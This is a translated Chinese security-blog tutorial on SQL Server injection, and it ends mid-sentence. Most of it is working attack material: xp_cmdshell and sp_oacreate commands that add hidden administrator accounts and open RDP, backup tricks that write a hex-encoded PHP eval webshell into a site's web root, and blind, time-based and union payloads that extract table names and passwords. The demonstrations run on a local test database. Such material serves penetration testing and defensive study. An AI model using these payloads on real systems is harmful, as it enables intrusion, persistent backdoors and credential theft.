# SQLServer数据库注入详解

阅读量 **420626**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-06-05 10:30:18

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

##

## SQLServer数据库

**SQL Server** 数据库是由Microsoft开发和推广的关系数据库管理系统(DBMS)，是一个比较大型的数据库。端口号为 **1433**
。数据库后缀名 .mdf，注释符是 — 。延时命令：WAITFOR DELAY ‘0:0:2’

##

**SQLServer有三个权限级别：**

  1. sa权限：数据库操作，文件管理，命令执行，注册表读取等system。SQLServer数据库的最高权限
  2. db权限：文件管理，数据库操作等权限 users-administrators
  3. public权限：数据库操作 guest-users

**判断当前用户权限**

    
    
    判断是否是SA权限
    select is_srvrolemember('sysadmin')     
    判断是否是db_owner权限  
    select is_member('db_owner')
    判断是否是public权限
    select is_srvrolemember('public')

![](https://p5.ssl.qhimg.com/t0185db004bf19ac785.png)

SQLServer数据库有6个默认的库，分别是4个系统数据库：master 、model 、msdb
、tempdb，和2个实例数据库：ReportServer、ReportServerTempDB。其中，系统数据库 model 和 tempdb
默认是没有数据表的。

  1. master数据库：master数据库控制SQL Server的所有方面。这个数据库中包括所有的配置信息、用户登录信息、当前正在服务器中运行的过程的信息。
  2. model数据库：model数据库是建立所有用户数据库时的模板。当你建立一个新数据库时，SQL Server会把model数据库中的所有对象建立一份拷贝并移到新数据库中。在模板对象被拷贝到新的用户数据库中之后，该数据库的所有多余空间都将被空页填满。
  3. msdb数据库：msdb数据库是SQL Server中的一个特例。如果你查看这个数据库的实际定义，会发现它其实是一个用户数据库。不同之处是SQL Server拿这个数据库来做什么。所有的任务调度、报警、操作员都存储在msdb数据库中。该库的另一个功能是用来存储所有备份历史。SQL Server Agent将会使用这个库。
  4. tempdb数据库：tempdb数据库是一个非常特殊的数据库，供所有来访问你的SQL Server的用户使用。这个库用来保存所有的临时表、存储过程和其他SQL Server建立的临时用的东西。例如，排序时要用到tempdb数据库。数据被放进tempdb数据库，排完序后再把结果返回给用户。每次SQL Server重新启动，它都会清空tempdb数据库并重建。永远不要在tempdb数据库建立需要永久保存的表。

![](https://p5.ssl.qhimg.com/t0149090ecbc805ea7c.png)

![](https://p4.ssl.qhimg.com/t01df10ff30e7873a56.png)

但是如果用navicat远程连接的话，只会显示2个实例数据库：ReportServer、ReportServerTempDB

![](https://p0.ssl.qhimg.com/t012813ffb70bd90040.png)

### **修改默认1433端口**

打开SQLServer配置管理器——>SQLServer网络配置——>MSSQLSERVER的协议——>TCP/IP，右键属性

![](https://p1.ssl.qhimg.com/t01b2240fdf58efcee6.png)

![](https://p0.ssl.qhimg.com/t01f8c6ed273586492b.png)

![](https://p5.ssl.qhimg.com/t011122a49e74c7a164.png)

### SQLServer数据库的管理

![](https://p3.ssl.qhimg.com/t01956f390923b9d37e.png)

服务器名称：主机,端口

**Windows身份验证管理**

![](https://p0.ssl.qhimg.com/t01a4f699d06fbbbc3a.png)

**SQLServer身份验证管理**

![](https://p1.ssl.qhimg.com/t012f205a31f9327f00.png)

### SQLServer数据库的查询语句

    
    
    select @@version;       #查询数据库的版本
    select @@servername;    #查询服务名
    select host_name();     #查询主机名，如果是用navicat远程连接的话，主机名是本地的名字
    select db_name();       #查询当前数据库名
    select db_name(1);      #查询第一个数据库名
    select db_name(2);      #查询第二个数据库名
    select user;            #查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner 
    use tempdb              #切换到tempdb表  
    top n                   #查询前n条记录
    limit 2,3               #查询第2条开始的3条数据，也就是2,3,4
    select substring('string',2,1)     #截取给定字符串的索引为2的1个字符
    select ascii('a')                  #查询给定字符串的ascii值
    select len('string')               #查询给定字符串的长度
    EXEC sp_spaceused @updateusage = N'TRUE';  #查询当前数据库的大小
    sp_spaceused '表名'                #查询指定表名的大小
    
    判断是否是SA权限
    select is_srvrolemember('sysadmin')     
    判断是否是db_owner权限  
    select is_member('db_owner')
    判断是否是public权限
    select is_srvrolemember('public')
    
    #数据库的连接
    server=127.0.0.1;UID=sa;PWD=123456;database=master;Provider=SQLOLEDB
    mssql://sa:123456@127.0.0.1/XCCMS_SocialBusinessDB
    
    count(name)是查询总数
    name是查询名字
    *是查询详细信息
    
    #查询数据库
    select count(name) from sysdatabases     #查询数据库的个数,只有当前数据库是master的时候，才能执行该命令
    select name  from sysdatabases           #查询数据库的名字
    select * from sysdatabases               #查询所有数据库的信息
    
    #查询数据表
    select count(name) from sysobjects where type='U' #查询当前数据库中表的个数
    select name from sysobjects where type='U'  #查询当前数据库中所有表的名字
    select * from sysobjects where type='U'    #查询当前数据库的所有表的详细信息
    
    select count(name) from test..sysobjects where xtype='U'  #查询指定test数据库中表的个数
    select name from test..sysobjects where xtype='U'         #查询指定test数据库中表的名字
    select * from test..sysobjects where xtype='U'            #查询指定test数据库中表的详细信息
    
    #查询列
    select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users')            #查询当前数据库的指定users表的列的个数
    select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users')         #查询当前数据库的指定users表的所有列的名字
    select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users')      #查询当前数据库的指定users表的列的详细信息
    
    select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users')     #查询指定test数据库的指定users表的列的个数
    select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users')       #查询指定test数据库的指定users表的所有列的名字
    select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users')       #查询指定test数据库的指定users表的列的详细信息
    
    #查询数据
    select count(*) from test..users          #查询test数据库user表的数据的条数
    select * from test..users                 #查询test数据库user表的所有数据
    
    
    declare  @table_spaceused table
    (name   nvarchar(100)
    ,rows   int
    ,reserved   nvarchar(100)
    ,data   nvarchar(100)
    ,index_size nvarchar(100)
    ,unused nvarchar(100)
    )
     
    insert into @table_spaceused
    (name,rows,reserved,data,index_size,unused )
    exec sp_MSforeachtable
    @command1='exec sp_spaceused ''?'''
     
    select * from @table_spaceused

## SA权限开启xp_cmdshell获取主机权限

判断 xp_cmdshell 是否打开，1就是打开了，0就是关闭了

    
    
    select count(*) FROM master..sysobjects Where xtype = 'X' AND name = 'xp_cmdshell' 

![](https://p3.ssl.qhimg.com/t01db0e6f576b5b13ea.png)

如果xp_cmdshell权限没开启的话，我们可以执行下面命令开启，下面四步，使xp_cmdshell开启

    
    
    execute('sp_configure "show advanced options",1')  #将该选项的值设置为1
    execute('reconfigure')                             #保存设置
    execute('sp_configure "xp_cmdshell", 1')           #将xp_cmdshell的值设置为1
    execute('reconfigure')                             #保存设置
    execute('sp_configure')                            #查看配置
    execute('xp_cmdshell "whoami"')                    #执行系统命令
    
    或者
    exec sp_configure 'show advanced options',1;       #将该选项的值设置为1
    reconfigure;                                       #保存设置
    exec sp_configure 'xp_cmdshell',1;                 #将xp_cmdshell的值设置为1
    reconfigure;                                       #保存设置
    exec sp_configure;                                  #查看配置
    exec xp_cmdshell 'whoami';                          #执行系统命令
    
    
    可以执行系统权限之后,前提是获取的主机权限是administrators组里的
    exec xp_cmdshell 'net user Guest 123456'              #给guest用户设置密码
    exec xp_cmdshell 'net user Guest /active:yes'         #激活guest用户
    exec xp_cmdshell 'net localgroup administrators Guest /add'  #将guest用户添加到administrators用户组
    exec xp_cmdshell 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'        #开启3389端口

![](https://p3.ssl.qhimg.com/t0157392eba39235896.png)

![](https://p0.ssl.qhimg.com/t016e57745de9b42c48.png)

## SA权限使用sp_oacreate执行系统命令

使用下面命令查看是否可使用 sp_oacreate 执行系统命令

    
    
    declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'whoami'

![](https://p2.ssl.qhimg.com/t01d005b95e34c8b2a1.png)

如果SQLServer 阻止了对组件 ‘Ole Automation Procedures’ 的过程 ‘sys.sp_OACreate’
的访问，可以使用以下命令打开。

    
    
    EXEC sp_configure 'show advanced options', 1;  
    RECONFIGURE WITH OVERRIDE;  
    EXEC sp_configure 'Ole Automation Procedures', 1;  
    RECONFIGURE WITH OVERRIDE;  

![](https://p0.ssl.qhimg.com/t013c3320c97fb8dcd8.png)

再次执行命令，发现不报错。此时可以执行系统命令了，但是使用 sp_oacreate 执行系统命令不回显

![](https://p1.ssl.qhimg.com/t01e95b767d4c06f63a.png)

于是我们可以使用以下命令创建用户hack。

    
    
    declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user hack Password@ /add'

![](https://p1.ssl.qhimg.com/t01aeeb874294e4341f.png)

![](https://p5.ssl.qhimg.com/t013c432242c8884e41.png)

## DB_owner权限LOG备份Getshell

无论是LOG备份还是差异备份，都是利用备份的过程中写入一句话木马

**SQLServer常见的备份策略：**

  1. 每周一次完整备份
  2. 每天一次差异备份
  3. 每小时一次事务日志备份

**利用前提** ：

  1. 目标机器存在数据库备份文件 ，也就是如下，我们利用test数据库的话，则需要该test数据库存在数据库备份文件
  2. 知道网站的绝对路径
  3. 该注入支持堆叠注入

    
    
    alter database 数据库名 set RECOVERY FULL;   #修改数据库恢复模式为 完整模式
    create table cmd (a image);        #创建一张表cmd，只有一个列 a，类型为image
    backup log 数据库名 to disk= 'C:\phpstudy\WWW\1.php' with init;   #备份表到指定路径
    insert into cmd (a) values(0x3c3f70687020406576616c28245f504f53545b785d293b3f3e);  #插入一句话到cmd表里
    backup log 数据库名 to disk='C:\phpstudy\WWW\2.php';   #把操作日志备份到指定文件
    drop table cmd;    #删除cmd表

第四行的 0x3c3f70687020406576616c28245f504f53545b785d293b3f3e 是一句话木马 <?php
@eval($_POST[x]);?> 的16进制表示

![](https://p1.ssl.qhimg.com/t01bd4039944762a4d4.png)

![](https://p1.ssl.qhimg.com/t0106e78a48538703e3.png)

![](https://p5.ssl.qhimg.com/t01cf48fe4e4ad7553d.png)

![](https://p1.ssl.qhimg.com/t0156ba54b9ad565401.png)

![](https://p2.ssl.qhimg.com/t01e5acfde983d9e34f.png)

![](https://p1.ssl.qhimg.com/t0102e6ebd0019ab888.png)

会在目标网站根目录下生成1.php和2.php文件，其中1.php 保存数据库，2.php就是我们需要连接的木马文件。

![](https://p2.ssl.qhimg.com/t0164e2eeb0ecc2ccf2.png)

用菜刀连接即可

![](https://p2.ssl.qhimg.com/t010dc78d719b24df50.png)

## DB_owner权限差异备份Getshell

**利用前提** ：

  1. 知道网站的绝对路径 C:phpstudyWWW
  2. 该注入支持堆叠注入

注：以下语句一条一条执行

    
    
    create table [dbo].[test] ([cmd] [image])
    declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x786965 backup log @a to disk = @s with init,no_truncate
    insert into [test](cmd) values(0x3c3f70687020406576616c28245f504f53545b785d293b3f3e)
    declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x43003A005C00700068007000730074007500640079005C005700570057005C007300680065006C006C002E00700068007000 backup log @a to disk=@s with init,no_truncate
    Drop table [test]

  1. 这里第二行的 0x786965，是字符 xie 的16进制表示，这里随便填都可以
  2. 第三行的 0x3c3f70687020406576616c28245f504f53545b785d293b3f3e 是一句话木马 <?php @eval($_POST[x]);?> 的16进制表示
  3. 第四行的0x43003A005C00700068007000730074007500640079005C005700570057005C007300680065006C006C002E00700068007000是 C:phpstudyWWWshell.php 的16进制表示

![](https://p2.ssl.qhimg.com/t01fd6bfb11e4c9d144.png)

![](https://p0.ssl.qhimg.com/t01552e8d104130c947.png)

![](https://p4.ssl.qhimg.com/t015586499f552f75a3.png)

![](https://p4.ssl.qhimg.com/t01326dc5eb0c0f3d15.png)

![](https://p1.ssl.qhimg.com/t01e8917a3953313898.png)

![](https://p4.ssl.qhimg.com/t01cf159feca0719c46.png)

然后会在目标网站根目录下生成shell.php木马文件

![](https://p2.ssl.qhimg.com/t01e78f63a5117a7c3f.png)

用菜刀连接即可

![](https://p1.ssl.qhimg.com/t01557cdcf1ab41ae68.png)

## 盲注SQLServer数据库

**判断是否是SQLServer数据库**

SQLServer数据库特有的表是： **sysobjects** ，所以可以用它来判断是否是SQLServer数据库

    
    
    exists(select*from sysobjects)  

![](https://p3.ssl.qhimg.com/t012da26ed96c847003.png)

![](https://p3.ssl.qhimg.com/t01f1e63a2febb3fb63.png)

**判断当前数据库用户权限**

    
    
    and 1=(IS_SRVROLEMEMBER('sysadmin'))        //返回正常为sa
    and 1=(IS_MEMBER('db_owner'))               //返回正常为DB_OWNER
    and 1=(IS_srvrolemember('public'))          //public权限,较低

如果当前用户是sa，则执行三个都正常显示。如果是db_owner，则执行sa不正常显示，执行public正常显示。如果是public，则只执行public才正常显示

![](https://p0.ssl.qhimg.com/t013fea8b3ad124b78a.png)

**判断xp_cmdshell是否存在**

    
    
    and 1=(Select count(*) FROM master..sysobjects Where xtype = 'X' AND name = 'xp_cmdshell')  

![](https://p5.ssl.qhimg.com/t0145770e6f7aa53356.png)

正常显示，说明已开启。如果不存在，则需要开启。

如果开启后，相关通过xp_cmdshell执行系统命令，需要该注入点存在堆叠注入

![](https://p1.ssl.qhimg.com/t0182fa5c6db625d684.png)

**判断数据库的个数**

    
    
    and (select count(name) from master..sysdatabases)=N

由图可知，有7个数据库

![](https://p3.ssl.qhimg.com/t01dbb2138cbde14d26.png)

**判断dbid个数，一般数据库有多少个，dbid的值就为多少**

    
    
     and (select count(*) from master..sysdatabases where dbid=N)=1

![](https://p4.ssl.qhimg.com/t01a720fe3d485af6d4.png)

**通过dbid得到所有数据库名**

当使用上一条命令不能执行时，可以使用下面的命令，查询数据库的个数，以及每个数据库的名字

    
    
    判断dbid数据库的长度，由以下得知dbid为1数据库的长度是8
    and len(db_name(1))>5         //正常显示
    and len(db_name(1))>6         //不正常显示
    
    大于5正常显示，大于6不正常显示，所以第一个数据库长度是6，即
    一般来说，查的前6个数据库就是自带的那6个数据库，第7个开始才是我们自己建的
    
    and len(db_name(7))>3         //正常显示
    and len(db_name(7))>4         //不正常显示
    大于3正常显示，大于4不正常显示，所以第7个数据库名的长度为4
    
    判断dbid为7数据库字符的ascii值
    and ascii(substring(db_name(7),1,1))>100   //正常显示
    and ascii(substring(db_name(7),1,1))>150   //不正常显示
    and ascii(substring(db_name(7),1,1))>125   //不正常显示
    and ascii(substring(db_name(7),1,1))>112   //正常显示
    and ascii(substring(db_name(7),1,1))>118   //不正常显示
    and ascii(substring(db_name(7),1,1))>115   //正常显示
    and ascii(substring(db_name(7),1,1))>116   //不正常显示
    
    大于115正常显示，大于116不正常显示，所以第七个数据库的第一个字符的ascii值为116，对应的字符是t
    
    以此类推，数据库的第二个字符为  and ascii(substring(db_name(7),2,1))>100
             数据库的第三个字符为：and ascii(substring(db_name(7),3,1))>100
             数据库的第三个字符为：and ascii(substring(db_name(7),4,1))>100
    最后得到第7个数据库名为：test

**判断当前数据库名**

    
    
    判断数据库的长度，由以下得知数据库的长度是8
    and len(db_name())>3         //正常显示
    and len(db_name())>4         //不正常显示
    
    大于3正常显示，大于4不正常显示，所以数据库名的长度为4
    
    判断数据库字符的ascii值，用二分法
    and ascii(substring(db_name(),1,1))>100   //正常显示
    and ascii(substring(db_name(),1,1))>150   //不正常显示
    and ascii(substring(db_name(),1,1))>125   //不正常显示
    and ascii(substring(db_name(),1,1))>112   //正常显示
    and ascii(substring(db_name(),1,1))>118   //不正常显示
    and ascii(substring(db_name(),1,1))>115   //正常显示
    and ascii(substring(db_name(),1,1))>116   //不正常显示
    
    大于115正常显示，大于116不正常显示，所以数据库第一个字符的ascii值为116，对应的字符是t
    
    以此类推，数据库的第二个字符为  and ascii(substring(db_name(),2,1))>100
             数据库的第三个字符为：and ascii(substring(db_name(),3,1))>100
             数据库的第三个字符为：and ascii(substring(db_name(),4,1))>100
             
    最后得到数据库名为：test

这里我们已经知道了当前数据库名为： test

**爆破test数据库中表的个数**

    
    
    and (select count(name) from test..sysobjects where xtype='U')>0   正常显示
    and (select count(name) from test..sysobjects where xtype='U')>1   不正常显示
    所以test数据库只有一个表

**爆破test数据库中表**

这里爆破表的时候，不能爆破表名的长度，所以只能爆破表名的一个一个字符。当爆破到第某个字符出现其ascii值>0都不正常显示时，说明这个字符位不存在，所以到前一位为止。注意，这里爆破得到的表名有
dbo.

    
    
    第一个表的第一个字符的ascii值
    AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 0 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),1,1))>N
    第一个表的第二个字符的ascii值
    AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 0 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),2,1))>N
    第一个表的第三个字符的ascii值
    AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 0 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),3,1))>N
    ......
    当爆破到第10个字符的时候，发现>0都不正常显示，说明不存在第10位
    爆破得到表名为：dbo.users
    
    如果有第二个表，第三个表...
    
    爆破第二个表的第一个字符的ascii值
    AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 1 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),1,1))>N
    爆破第二个表的第二个字符的ascii值
    AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 1 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),2,1))>N
    爆破第二个表的第三个字符的ascii值
    AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 1 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),3,1))>N
    ......
    
    爆破第三个表的第一个字符的ascii值
    AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 2 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),1,1))>N
    爆破第三个表的第二个字符的ascii值
    AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 2 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),2,1))>N
    爆破第三个表的第三个字符的ascii值
    AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 2 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),3,1))>N

这里我们爆出了test数据库中存在 dbo.users 表

**爆破test数据库中user表的字段数**

    
    
    and (select count(name) from test..syscolumns where id=(select id from test..sysobjects where name='users'))=3  #正常显示
    所以users表有3个字段

这里我们爆出了test数据库中users表有3个字段

**爆破test数据库中users表的字段名**

    
    
    爆破test数据库中user表的第一个字段名的长度
    and len((select top 1 col_name(object_id('users'),1) from test..sysobjects))>1  正常显示
    and len((select top 1 col_name(object_id('users'),1) from test..sysobjects))>2  不正常显示
    所以users表的第一个字段名长度为2
    
    爆破test数据库中user表的第一个字段的第一个字符的ascii值,二分法
    and ascii(substring((select top 1 col_name(object_id('users'),1) from test..sysobjects),1,1))>N
    爆破test数据库中user表的第一个字段的第二个字符的ascii值：
    and ascii(substring((select top 1 col_name(object_id('users'),1) from test..sysobjects),2,1))>N
    ........
    最后得到第一个字段为：id
    
    爆破test数据库中user表的第二个字段名的长度
    and len((select top 1 col_name(object_id('users'),2) from test..sysobjects))>N
    
    爆破test数据库中user表的第二个字段的第一个字符的ascii值：
    and ascii(substring((select top 1 col_name(object_id('users'),2) from test..sysobjects),1,1))>N
    爆破test数据库中user表的第二个字段的第二个字符的ascii值：
    and ascii(substring((select top 1 col_name(object_id('users'),2) from test..sysobjects),2,1))>N
    爆破test数据库中user表的第三个字段的第三个字符的ascii值：
    and ascii(substring((select top 1 col_name(object_id('users'),2) from test..sysobjects),3,1))>N
    
    爆破test数据库中user表的第三个字段名的长度
    and len((select top 1 col_name(object_id('users'),3) from test..sysobjects))>N
    ........

这里假设我们爆出了users表的三个字段名：id，username，password

**爆test数据库user表中数据总条数**

    
    
    and (select count(*) from test..users)=N

由图可知只有四条数据

![](https://p1.ssl.qhimg.com/t01331cfdc1b8f5cff5.png)

**爆破test数据库中user表中password列中的数据**

这里爆破数据的时候，不能爆破数据的长度，所以只能爆破数据的一个一个字符。当爆破到第某个字符出现其ascii值>0都不正常显示时，说明这个字符位不存在，所以到前一位为止。

    
    
    爆破test数据库中users表中password列中第一行数据的第一个字符的ascii值
    and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=1),1,1))>N
    爆破test数据库中user表中password列中第一行数据的第二个字符的ascii值
    and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=1),2,1))>N
    爆破test数据库中user表中password列中第一行数据的第三个字符的ascii值
    and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=1),3,1))>N
    爆破test数据库中user表中password列中第一行数据的第四个字符的ascii值
    and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=1),4,1))>N
    当爆破到第5个字符的时候，发现ascii>0都不正常显示，说明，第一个数据长度为4
    最后爆出test数据库users表password列的第一条数据是：root
    
    
    爆破test数据库中user表中password列中第二行数据的第一个字符的ascii值
    and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=2),1,1))>N
    爆破test数据库中user表中password列中第二行数据的第二个字符的ascii值
    and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=2),2,1))>N
    爆破test数据库中user表中password列中第二行数据的第三个字符的ascii值
    and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=2),3,1))>N
    ........

## 延时注入

    
    
    判断是否是SA权限
    if(1=(select is_srvrolemember('sysadmin'))) WAITFOR DELAY '0:0:2'
    判断是否是站库分离(延时后返回正确页面，确定站库没有分离)
    if(host_name()=@@servername) WAITFOR DELAY '0:0:2'
    
    判断数据库的个数
    IF(UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(name))) AS NVARCHAR(4000)),CHAR(32)) FROM master..sysdatabases),1,1))=55) WAITFOR DELAY '0:0:2' 
    
    判断是否开启xp_cmdshell
    if(1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')) WAITFOR DELAY '0:0:2'--    
    更多延时注入payload，可以查看sqlmap

根据响应时间判断执行是否正确

![](https://p4.ssl.qhimg.com/t018800cab7447ec1d4.png)

![](https://p0.ssl.qhimg.com/t012f2c279365fe4813.png)

## Union联合查询

    
    
    首先order by查看有几列
    1 order by 3  正常显示
    1 order by 4  不正常显示
    说明有3列
    
    然后我们可以select NULL,NULL,想查询的数据

查询数据库版本

![](https://p2.ssl.qhimg.com/t0135b17ade9811efe6.png)

查询机器名

![](https://p3.ssl.qhimg.com/t01a2815c3909519149.png)

查询所有数据库名

![](https://p5.ssl.qhimg.com/t018e87da0c719981d8.png)

堆叠注入

![](https://p2.ssl.qhimg.com/t01909dee97c30bc0b7.png)

SQLServer堆叠注入，由于执行的命令没有回显，所以需要结合时间盲注来查询数据。由于堆叠查询的语句会被执行，所以下面的SQLServer获取权限的奇淫技巧，就是利用到了堆叠注入这一特性。

## SQLServer获取权限的奇淫技巧

利用前提：

  1. 目标网站注入支持堆叠注入
  2. 当前权限是SA权限
  3. 使用sqlmap的 –os-shell 无法获取到权限

这里很多人就会问了，既然是SA权限，不是可以直接利用xp_cmdshell执行系统命令吗？对，没错，但是你使用xp_cmdshell执行的命令没有回显。我们这个获取权限的思路就是，找到目标网站的绝对路径，然后往绝对路径下写入木马，然后获取权限。

我们这里是通过先找到目标网站的一个文件，然后通过遍历目标服务器的磁盘，找到该文件，将其路径写入自建的表中，然后再读取该表得到网站绝对路径。

这里利用的查找命令是

    
    
    查找目标机器C盘下的test.txt文件
